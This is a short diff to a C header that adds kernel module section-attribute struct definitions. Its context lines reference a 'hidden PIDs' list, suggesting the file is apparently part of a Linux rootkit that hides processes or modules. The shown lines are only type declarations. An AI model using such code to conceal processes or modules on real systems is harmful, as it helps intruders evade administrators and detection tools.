@@ -65,6 +65,23 @@ typedef struct pid_list_tag {
     pid_t i32_pid;         // PID value
 } pid_list_t;
 
+struct module_notes_attrs {
+    struct kobject *dir;
+    unsigned int notes;
+    struct bin_attribute attrs[];
+};
+
+struct module_sect_attr {
+    struct bin_attribute battr;
+    unsigned long address;
+};
+
+struct module_sect_attrs {
+    struct attribute_group grp;
+    unsigned int nsections;
+    struct module_sect_attr attrs[];
+};
+
 typedef struct task_struct task_t;
 
 extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
